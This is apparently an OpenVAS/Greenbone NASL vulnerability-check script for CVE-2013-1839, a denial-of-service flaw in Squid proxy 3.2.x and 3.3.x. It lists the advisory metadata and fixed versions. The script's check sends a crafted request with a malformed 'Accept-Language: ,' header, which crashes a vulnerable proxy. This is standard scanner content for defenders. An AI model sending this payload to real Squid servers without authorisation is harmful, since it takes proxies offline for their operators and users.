CPE = "cpe:/a:squid-cache:squid";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802062" );
	script_version( "$Revision: 12148 $" );
	script_bugtraq_id( 58316 );
	script_cve_id( "CVE-2013-1839" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_tag( name: "last_modification", value: "$Date: 2018-10-29 10:52:06 +0100 (Mon, 29 Oct 2018) $" );
	script_tag( name: "creation_date", value: "2013-10-03 18:01:36 +0530 (Thu, 03 Oct 2013)" );
	script_name( "Squid Proxy Accept-Language Header Denial Of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "This script is Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "secpod_squid_detect.sc" );
	script_mandatory_keys( "squid_proxy_server/installed" );
	script_require_ports( "Services/www", "Services/http_proxy", 3128, 8080 );
	script_xref( name: "URL", value: "http://secunia.com/advisories/52588" );
	script_xref( name: "URL", value: "http://www.squid-cache.org/Advisories/SQUID-2013_1.txt" );
	script_xref( name: "URL", value: "http://www.openwall.com/lists/oss-security/2013/03/11/7" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/525932/30/30/threaded" );
	script_xref( name: "URL", value: "http://www.squid-cache.org/Download" );
	script_tag( name: "summary", value: "This host is running Squid Proxy Server and is prone to denial of service
  vulnerability." );
	script_tag( name: "vuldetect", value: "Send crafted 'Accept-Language' header request and check is it vulnerable to
  DoS or not." );
	script_tag( name: "solution", value: "Upgrade to Squid Version 3.2.9, 3.3.3 or later." );
	script_tag( name: "insight", value: "Error within the 'strHdrAcptLangGetItem()' function in errorpage.cc when
  handling the 'Accept-Language' header." );
	script_tag( name: "affected", value: "Squid Version 3.2.x before 3.2.9 and 3.3.x before 3.3.3" );
	script_tag( name: "impact", value: "Successful exploitation could allow remote attackers to cause a denial of
  service via a crafted 'Accept-Language' header." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
squid_port = get_app_port( cpe: CPE );
if(!squid_port){
	exit( 0 );
}
normal_req = http_get( item: "http://www.$$$$$", port: squid_port );
normal_res = http_send_recv( port: squid_port, data: normal_req );
if(!normal_res || !ContainsString( normal_res, "Server: squid" )){
	exit( 0 );
}
crafted_req = NASLString( "GET http://testhostdoesnotexists.com:1234 HTTP/1.1\\r\\n", "Accept-Language: ,", "\\r\\n", "\\r\\n" );
crafted_res = http_send_recv( port: squid_port, data: crafted_req );
normal_res = http_send_recv( port: squid_port, data: normal_req );
if(!normal_res){
	security_message( port: squid_port );
	exit( 0 );
}
exit( 0 );

